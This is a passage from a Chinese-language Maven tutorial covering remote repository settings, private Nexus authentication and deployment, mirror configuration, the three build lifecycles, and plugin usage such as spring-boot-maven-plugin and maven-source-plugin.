<td>repository</td>
<td>在repositories元素下，可以使用repository子元素声明一个或者多个远程仓库。</td>
</tr>
<tr>
<td>id</td>
<td>仓库声明的唯一id。<br>尤其需要注意的是，Maven自带的中央仓库使用的id为central，如果其他仓库声明也使用该id，就会覆盖中央仓库的配置。</td>
</tr>
<tr>
<td>name</td>
<td>仓库的名称，让我们直观方便的知道仓库是哪个，暂时没发现其他太大的含义。</td>
</tr>
<tr>
<td>url</td>
<td>指向了仓库的地址，一般来说，该地址都基于http协议，Maven用户都可以在浏览器中打开仓库地址浏览构件。</td>
</tr>
<tr>
<td><strong>releases 和 snapshots</strong></td>
<td>用来控制Maven对于发布版构件和快照版构件的下载权限。<br>- <code>releases</code>的enable设置为true，表示开启JBoss仓库的<code>发布版本</code>下载支持，<br>- <code>snapshots</code>的enabled值为false，表示关闭JBoss仓库的<code>快照版本</code>的下载支持。<br>根据该配置，Maven只会从JBoss仓库下载发布版的构件，而不会下载快照版的构件。</td>
</tr>
<tr>
<td>layout</td>
<td>元素值<code>default</code>表示仓库的布局是Maven2及Maven3的默认布局，而不是Maven1的布局。<br>基本不会用到Maven1的布局。</td>
</tr>
<tr>
<td>releases或者snapshots的<code>updatePolicy</code></td>
<td>用来配置Maven从远处仓库检查更新的频率<br>默认值是<code>daily</code>，表示Maven每天检查一次。<br><code>never</code>：从不检查更新；<br><code>always</code>：每次构建都检查更新</td>
</tr>
<tr>
<td>releases或者snapshots的<code>checksumPolicy</code></td>
<td>配置Maven检查校验和文件的策略。<br>当构建被部署到Maven仓库中时，会同时部署对应的检验和文件。<br>在下载构件的时候，Maven会验证校验和文件，如果校验和验证失败，当checksumPolicy的值为<br><code>warn</code>（默认）：Maven会在执行构建时输出警告信息<br><code>fail</code>：Maven遇到校验和错误就让构建失败<br><code>ignore</code>：使Maven完全忽略校验和错误</td>
</tr>
</tbody>
</table>
<h2 id="2、Maven私服的认证">2、Maven私服的认证</h2>
<p>大部分公共的远程仓库无须认证就可以直接访问，但我们在平时的开发中往往会架设自己的Maven私服，出于安全方面的考虑，我们需要提供认证信息才能访问这样的远程仓库。</p>
<p>配置认证信息和配置远程仓库不同，远程仓库可以直接在<code>pom.xml</code>中配置，但是认证信息必须配置在<code>settings.xml</code>文件中。</p>
<p>这是因为pom往往是被提交到代码仓库中供所有成员访问的，而<code>settings.xml</code>一般只存在于本机。因此，在<code>settings.xml</code>中配置认证信息更为安全。</p>
<p>Maven使用<code>settings.xml</code>文件中的<code>servers</code>元素及其子元素<code>server</code>配置仓库认证信息。</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;settings&gt;
     ...
     &lt;!--配置远程仓库认证信息--&gt;
     &lt;servers&gt;
         &lt;server&gt;
             &lt;id&gt;releases&lt;/id&gt;
             &lt;username&gt;admin&lt;/username&gt;
             &lt;password&gt;admin123&lt;/password&gt;
         &lt;/server&gt;
     &lt;/servers&gt;
     ...
&lt;/settings&gt;123456789101112<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上面代码我们配置了一个<code>id</code>为<code>releases</code>的远程仓库认证信息。认证用户名为admin，认证密码为admin123。</p>
<p>这里的关键是<code>id</code>元素，<code>settings.xml</code>中<code>server</code>元素的<code>id</code>必须与<code>pom.xml</code>中需要认证的<code>repository</code>元素的<code>id</code>完全一致。</p>
<p>正是这个id将认证信息与仓库配置联系在了一起。</p>
<h2 id="3、部署构件至私服">3、部署构件至私服</h2>
<p>我们使用自己的远程仓库的目的就是在远程仓库中部署我们自己项目的构件以及一些无法从外部仓库直接获取的构件。这样才能在开发时，供其他对团队成员使用。</p>
<p>Maven除了能对项目进行编译、测试、打包之外，还能将项目生成的构件部署到远程仓库中。</p>
<p><strong>首先，需要编辑项目的<code>pom.xml</code>文件。配置<code>distributionManagement</code>元素</strong>，代码如下：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>distributionManagement</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>repository</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>releases<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>public<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">&gt;</span></span>http://59.50.95.66:8081/nexus/content/repositories/releases<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>repository</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>snapshotRepository</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>snapshots<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>Snapshots<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">&gt;</span></span>http://59.50.95.66:8081/nexus/content/repositories/snapshots<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>snapshotRepository</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>distributionManagement</span><span class="token punctuation">&gt;</span></span>123456789101112<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>distributionManagement</code>包含<code>repository</code>和<code>snapshotRepository</code>子元素。</p>
<p><code>repository</code>： 表示发布版本（稳定版本）构件的仓库</p>
<p><code>snapshotRepository</code>：表示快照版本（开发测试版本）的仓库</p>
<p>这两个元素都需要配置id、name和url。<code>id</code>为远程仓库的唯一标识，<code>name</code>是为了方便人阅读，关键的<code>url</code>表示该仓库的地址。</p>
<p>往远程仓库部署构件的时候，往往需要认证，配置认证的方式同上。</p>
<p>配置正确后，运行命令<code>mvn clean deploy</code>，Maven就会将项目构建输出的构件部署到配置对应的远程仓库，如果项目当前的版本是快照版本，则部署到快照版本的仓库地址，否则就部署到发布版本的仓库地址。</p>
<h2 id="4、配置远程仓库的镜像">4、配置远程仓库的镜像</h2>
<p><strong>如果仓库X可以提供仓库Y存储的所有内容，那么就可以认为X是Y的一个镜像</strong>。换句话说，任何一个可以从仓库Y获得的构件，都能够从它的镜像中获取。</p>
<p>举个例子，<a href="http://maven.oschina.net/content/groups/public/">http://maven.oschina.net/content/groups/public/</a> 是中央仓库http://repo1.maven.org/maven2/ 在中国的镜像，由于地理位置的因素，该镜像往往能够提供比中央仓库更快的服务。</p>
<p>因此，可以配置Maven使用该镜像来替代中央仓库。编辑<code>settings.xml</code>，代码如下：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrors</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirror</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>maven.oschina.net<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>maven mirror in China<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">&gt;</span></span>http://maven.oschina.net/content/groups/public/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrorOf</span><span class="token punctuation">&gt;</span></span>central<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrorOf</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirror</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrors</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<table>
<thead>
<tr>
<th>配置</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>**<code>mirrorOf</code> **</td>
<td>该例中，<code>mirrorOf</code> 的值为central，表示该配置为中央仓库的镜像，任何对于中央仓库的请求都会转至该镜像，用户也可以使用同样的方法配置其他仓库的镜像</td>
</tr>
<tr>
<td><code>id</code></td>
<td>表示镜像的唯一标识符</td>
</tr>
<tr>
<td><code>name</code></td>
<td>表示镜像的名称</td>
</tr>
<tr>
<td><code>url</code></td>
<td>表示镜像的地址</td>
</tr>
</tbody>
</table>
<p>关于镜像的一个更为常见的用法是结合私服。由于私服可以代理任何外部的公共仓库(包括中央仓库)，因此，对于组织内部的Maven用户来说，使用一个私服地址就等于使用了所有需要的外部仓库，这可以将配置集中到私服，从而简化Maven本身的配置。在这种情况下，任何需要的构件都可以从私服获得，私服就是所有仓库的镜像。这时，可以配置这样的一个镜像：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--配置私服镜像--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrors</span><span class="token punctuation">&gt;</span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirror</span><span class="token punctuation">&gt;</span></span>  
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>nexus<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>  
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>internal nexus repository<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>  
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">&gt;</span></span>http://183.238.2.182:8081/nexus/content/groups/public/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">&gt;</span></span>  
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrorOf</span><span class="token punctuation">&gt;</span></span>*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrorOf</span><span class="token punctuation">&gt;</span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirror</span><span class="token punctuation">&gt;</span></span>  
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrors</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>该例中<code>&lt;mirrorOf&gt;</code>的值为星号，表示该配置是所有Maven仓库的镜像，任何对于远程仓库的请求都会被转至http://183.238.2.182:8081/nexus/content/groups/public/。</p>
<p>如果该镜像仓库需要认证，则配置一个id为nexus的认证信息即可。</p>
<p>需要注意的是，由于镜像仓库完全屏蔽了被镜像仓库，当镜像仓库不稳定或者停止服务的时候，Maven仍将无法访问被镜像仓库，因而将无法下载构件。</p>
<h2 id="5、可用的Maven镜像仓库">5、可用的Maven镜像仓库</h2>
<table>
<thead>
<tr>
<th>ID</th>
<th>mirror</th>
</tr>
</thead>
<tbody>
<tr>
<td>repo2</td>
<td><mirror><br>    <id>repo2</id><br>    <mirrorof>central</mirrorof><br>    <name>Human Readable Name for this Mirror.</name><br>    <url><a href="http://repo2.maven.org/maven2/">http://repo2.maven.org/maven2/</a></url><br></mirror></td>
</tr>
<tr>
<td>ibiblio</td>
<td><mirror><br>    <id>ibiblio</id><br>    <mirrorof>central</mirrorof><br>    <name>Human Readable Name for this Mirror.</name><br>    <url><a href="http://mirrors.ibiblio.org/pub/mirrors/maven2/">http://mirrors.ibiblio.org/pub/mirrors/maven2/</a></url><br></mirror></td>
</tr>
<tr>
<td>jboss</td>
<td><mirror><br>    <id>jboss-public-repository-group</id><br>    <mirrorof>central</mirrorof><br>    <name>JBoss Public Repository Group</name><br>    <url><a href="http://repository.jboss.org/nexus/content/groups/public">http://repository.jboss.org/nexus/content/groups/public</a></url><br></mirror></td>
</tr>
<tr>
<td>JBossJBPM</td>
<td><mirror><br>    <id>JBossJBPM</id><br>    <mirrorof>central</mirrorof><br>    <name>JBossJBPM Repository</name><br>    <url><a href="https://repository.jboss.org/nexus/content/repositories/releases/">https://repository.jboss.org/nexus/content/repositories/releases/</a></url><br></mirror></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="6、仓库搜索服务地址">6、仓库搜索服务地址</h2>
<table>
<thead>
<tr>
<th>名称</th>
<th>地址</th>
</tr>
</thead>
<tbody>
<tr>
<td>Sonatype Nexus</td>
<td><a href="https://repository.sonatype.org/">https://repository.sonatype.org/</a></td>
</tr>
<tr>
<td>MVNrepository</td>
<td><a href="http://mvnrepository.com/">http://mvnrepository.com/</a></td>
</tr>
</tbody>
</table>
<h1>Maven生命周期</h1>
<p>在有关Maven的日常使用中，命令行的输入往往就对应了生命周期，如<code>mvn package</code>就表示执行默认<a href="https://so.csdn.net/so/search?q=%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F&amp;spm=1001.2101.3001.7020">生命周期</a>阶段package。</p>
<p>Maven的生命周期是抽象的，其实际行为都由插件来完成，如<code>package阶段</code>的任务可能就会由<code>maven-jar-plugin</code>完成。<code>生命周期</code>和<code>插件</code>两者协同工作，密不可分。</p>
<h2 id="1、Maven生命周期">1、Maven生命周期</h2>
<p>我们在开发项目的时候，我们不断地在经历编译、测试、打包、部署等过程，maven的生命周期就是对所有这些过程的一个抽象与统一，她的<strong>生命周期包含项目的清理、初始化、编译、测试、打包、集成测试、验证、部署、站点生成等几乎所有的过程</strong>，而且maven的生命周期是及其灵活，她<strong>生命周期的每个阶段是通过插件来实现的</strong>，maven也内置了很多插件，所以我们在项目进行编译、测试、打包的过程是没有感觉到。像编译是通过maven-compile-plugin实现的、测试是通过maven-surefire-plugin实现的。</p>
<p><strong>Maven有三套相互独立的生命周期</strong>，请注意这里说的是“三套”，而且“相互独立”，初学者容易将Maven的生命周期看成一个整体，其实不然。这三套生命周期分别是：</p>
<ul>
<li>Clean Lifecycle 在进行真正的构建之前进行一些清理工作。</li>
<li>Default Lifecycle 构建的核心部分，编译，测试，打包，部署等等。</li>
<li>Site Lifecycle 生成项目报告，站点，发布站点。</li>
</ul>
<p>我再次强调一下它们是<code>相互独立</code>的，你可以仅仅调用clean来清理工作目录，仅仅调用site来生成站点。当然你也可以直接运行<code>mvn clean install site</code>运行所有这三套生命周期。</p>
<blockquote>
<p>在一个生命周期中，运行某个阶段的时候，它之前的所有阶段都会被运行。</p>
<p>也就是说，<code>mvn clean</code>等同于 <code>mvn pre-clean clean</code>，如果我们运行<code>mvn post-clean</code>，那么<code>pre-clean</code>、<code>clean</code>都会被运行。</p>
</blockquote>
<h3 id="生命周期：Clean">生命周期：Clean</h3>
<ol>
<li>pre-clean 执行一些需要在clean之前完成的工作</li>
<li>clean 移除所有上一次构建生成的文件</li>
<li>post-clean 执行一些需要在clean之后立刻完成的工作</li>
</ol>
<h3 id="生命周期：Site">生命周期：Site</h3>
<ol>
<li>
<p>pre-site 执行一些需要在生成站点文档之前完成的工作。</p>
</li>
<li>
<p>site 生成项目的站点文档。</p>
</li>
<li>
<p>post-site 执行一些需要在生成站点文档之后完成的工作，并且为部署做准备。</p>
</li>
<li>
<p>site-deploy 将生成的站点文档部署到特定的服务器上。</p>
</li>
</ol>
<h3 id="生命周期：Default">生命周期：<code>Default</code></h3>
<ul>
<li>
<p>validate</p>
</li>
<li>
<p>initialize</p>
</li>
<li>
<p>generate-sources</p>
</li>
<li>
<p>process-sources 处理项目主资源文件。一般来说，是对<code>src/main/resources</code>目录的内容进行变量替换等工作后，复制到项目输出的<code>主classpath目录</code>中。</p>
</li>
<li>
<p>generate-resources</p>
</li>
<li>
<p>process-resources</p>
</li>
<li>
<p><code>compile</code> 编译项目的源代码。一般来说，是编译<code>src/main/java</code>目录下的Java文件至项目输出的<code>主classpath目录</code>中。</p>
</li>
<li>
<p>process-classes</p>
</li>
<li>
<p>generate-test-sources</p>
</li>
<li>
<p>process-test-sources 处理项目测试资源文件。一般来说，是对<code>src/test/resources</code>目录的内容进行变量替换等工作后，复制到项目输出的<code>测试classpath目录</code>中。</p>
</li>
<li>
<p>generate-test-resources</p>
</li>
<li>
<p>process-test-resources</p>
</li>
<li>
<p>test-compile 编译项目的测试源代码。一般来说，是编译<code>src/test/java</code>目录下的Java文件至项目输出的<code>测试classpath目录</code>中。</p>
</li>
<li>
<p>process-test-classes</p>
</li>
<li>
<p><code>test</code> 使用合适的单元测试框架运行测试。这些测试代码不会被打包或部署。</p>
</li>
<li>
<p>prepare-package</p>
</li>
<li>
<p>package 接受编译好的代码，打包成可发布的格式，如 JAR 。</p>
</li>
<li>
<p>pre-integration-test</p>
</li>
<li>
<p>integration-test</p>
</li>
<li>
<p>post-integration-test</p>
</li>
<li>
<p>verify</p>
</li>
<li>
<p><code>install</code> 将包安装至本地仓库，以让其它项目依赖。</p>
</li>
<li>
<p><code>deploy</code> 将最终的包复制到远程的仓库，以让其它开发人员与Maven项目使用。</p>
</li>
</ul>
<p>基本上，根据名称我们就能猜出每个阶段的用途，关于阶段的详细解释以及其她阶段的解释，请参考 <a href="http://maven.apache.org/guides/introduction/introduction-to-the-lifecycle.html">http://maven.apache.org/guides/introduction/introduction-to-the-lifecycle.html</a> 。</p>
<p>记住，运行任何一个阶段的时候，它前面的所有阶段都会被运行，这也就是为什么我们运行<code>mvn install</code>的时候，代码会被编译，测试，打包。</p>
<p>此外，Maven的插件机制是完全依赖Maven的生命周期的，因此理解生命周期至关重要，接下来我将会进一步解释Maven的插件机制。</p>
<h2 id="2、命令行与生命周期">2、命令行与生命周期</h2>
<p>从命令行执行Maven任务的最主要方式就是调用Maven的生命周期阶段。需要注意的是，<strong>各个生命周期是相互独立的</strong>，而<strong>一个生命周期的阶段是有前后依赖关系的</strong>。</p>
<p>下面以一些常见的Maven命令为例，解释其执行的生命周期阶段：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>mvn clean</strong></td>
<td>该命令调用<code>clean</code>生命周期的<code>clean</code>阶段。<br>实际执行的阶段为<code>clean</code>生命周期的<code>pre-clean</code>和<code>clean</code>阶段。</td>
</tr>
<tr>
<td><strong>mvn test</strong></td>
<td>该命令调用<code>default生命周期</code>的<code>test阶段</code>。<br>实际执行的阶段为default生命周期的<code>validate</code>、<code>initialize</code>等，直到<code>test</code>的所有阶段。<br>这也解释了为什么在执行测试的时候，项目的代码能够自动得以编译。</td>
</tr>
<tr>
<td><strong>mvn clean install</strong></td>
<td>该命令调用<code>clean生命周期</code>的<code>clean阶段</code>和<code>default生命周期</code>的<code>install阶段</code>。<br>实际执行的阶段为clean生命周期的pre-clean、clean阶段，以及default生命周期的从validate至install的所有阶段。<br><br>该命令结合了两个生命周期，在执行正在的项目构建之前清理项目是一个很好的实践。</td>
</tr>
<tr>
<td><strong>mvn clean deploy site-deploy</strong></td>
<td>该命令调用<code>clean生命周期</code>的<code>clean阶段</code>、<code>default生命周期</code>的<code>deploy阶段</code>，以及<code>site生命周期</code>的<code>site-deploy阶段</code>。<br>实际执行的阶段为clean生命周期的pre-clean、clean阶段，default生命周期的所有阶段，以及site生命周期的所有阶段。<br><br>该命令结合了Maven所有三个生命周期，且deploy为default生命周期的最后一个阶段，site-deploy为site生命周期的最后一个阶段。</td>
</tr>
</tbody>
</table>
<p>由于Maven中主要的生命周期阶段并不多，而常用的Maven命令实际都是基于这些阶段简单组合而成的，因此只要对Maven生命周期有一个基本的理解，读者就可以正确而熟练地使用Maven命令。</p>
<h1>Maven插件机制</h1>
<blockquote>
<p>如何将插件与 Maven 的构建生命周期绑定在一起呢？通过将插件的目标（goal）与 build lifecycle 中 phase 绑定到一起，这样，当要执行某个 phase 时，就调用插件来完成绑定的目标。</p>
</blockquote>
<p>通过上面的生命周期我们可以了解到，不同的生命周期绑定不同的插件；同时我们知道，下载下来的maven核心的东西不过3-4M，它主要就是通过插件来完成这些工作的，一旦碰到没有的插件，它会跑到相应的地方下载，然后来完成整个过程。那么在我们的项目中如何使用插件呢？</p>
<p>打开**<code>http://maven.apache.org/plugins/index.html </code>**网址，可以看到apache下面的很多插件。</p>
<h2 id="spring-boot-maven-plugin"><a href="https://docs.spring.io/spring-boot/docs/current/maven-plugin/reference/htmlsingle">spring-boot-maven-plugin</a></h2>
<blockquote>
<p>要求Java 8, Maven 3.2及以后</p>
</blockquote>
<p><code>spring-boot-maven-plugin</code> 的构建目标：</p>
<table>
<thead>
<tr>
<th style="text-align:left">Goal</th>
<th style="text-align:left">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a href="https://docs.spring.io/spring-boot/docs/current/maven-plugin/reference/htmlsingle/#goals-build-info">spring-boot:build-info</a></td>
<td style="text-align:left">生成构建信息<code>build-info.properties </code>可供actuator 使用</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://docs.spring.io/spring-boot/docs/current/maven-plugin/reference/htmlsingle/#goals-help">spring-boot:help</a></td>
<td style="text-align:left">显示<code>spring-boot-maven-plugin</code>的帮助信息。<br>调用<code>mvn spring-boot:help -Ddetail=true -Dgoal=&lt;goal-name&gt;</code>显示参数详细信息。</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://docs.spring.io/spring-boot/docs/current/maven-plugin/reference/htmlsingle/#goals-repackage">spring-boot:repackage</a></td>
<td style="text-align:left">重新打包能用于从命令行使用<code>java -jar </code>执行的<code>JAR</code>和<code>WAR</code>文件。<br>使用<code>layout=NONE</code>也可以简单地用于打包带有嵌套依赖项的JAR（并且没有主类，因此不可执行）。</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://docs.spring.io/spring-boot/docs/current/maven-plugin/reference/htmlsingle/#goals-run">spring-boot:run</a></td>
<td style="text-align:left">运行你的Springboot应用</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://docs.spring.io/spring-boot/docs/current/maven-plugin/reference/htmlsingle/#goals-start">spring-boot:start</a></td>
<td style="text-align:left">启动spring应用程序。与“运行”目标相反，这不会阻塞，并允许其他目标对应用程序进行操作。<br>此目标通常用于集成测试场景，其中应用程序在测试案例之前启动，在测试案例之后停止。</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://docs.spring.io/spring-boot/docs/current/maven-plugin/reference/htmlsingle/#goals-stop">spring-boot:stop</a></td>
<td style="text-align:left">停止由“start”目标启动的应用程序。通常在测试案例完成后调用。</td>
</tr>
</tbody>
</table>
<p>指定入口Class文件</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${springboot.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mainClass</span><span class="token punctuation">&gt;</span></span>com.local.learn.producer.ProducerApplication<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mainClass</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>executions</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>execution</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goals</span><span class="token punctuation">&gt;</span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goal</span><span class="token punctuation">&gt;</span></span>repackage<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goal</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goals</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>execution</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>executions</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="maven-source-plugin">maven-source-plugin</h2>
<p>以 <a href="https://maven.apache.org/plugins/maven-source-plugin/"><code>source</code></a> (maven-source-plugin)为例：</p>
<p>Source插件是对源代码进行打包的一个插件，默认情况下，它会将生成的源代码放在工程目录的target下面。</p>
<p>Source插件具有五个<strong>目标</strong>：</p>
<ul>
<li><a href="http://maven.apache.org/plugins/maven-source-plugin/aggregate-mojo.html">source:aggregate</a> aggregrates sources for all modules in an aggregator project.</li>
<li><a href="http://maven.apache.org/plugins/maven-source-plugin/jar-mojo.html">source:jar</a> 用于将项目的主要源代码捆绑到JAR中</li>
<li><a href="http://maven.apache.org/plugins/maven-source-plugin/test-jar-mojo.html">source:test-jar</a> 将项目的测试源绑定到JAR中</li>
<li><a href="http://maven.apache.org/plugins/maven-source-plugin/jar-no-fork-mojo.html">source:jar-no-fork</a> 类似于<code>jar</code>，但不派生构建生命周期。</li>
<li><a href="http://maven.apache.org/plugins/maven-source-plugin/test-jar-no-fork-mojo.html">source:test-jar-no-fork</a> 类似于<code>test-jar</code>，但不派生构建生命周期。</li>
</ul>
<p>在我们的工程<code>pom.xml</code>中，在后面引入下面这段配置：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>maven-source-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.1.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">&gt;</span></span>
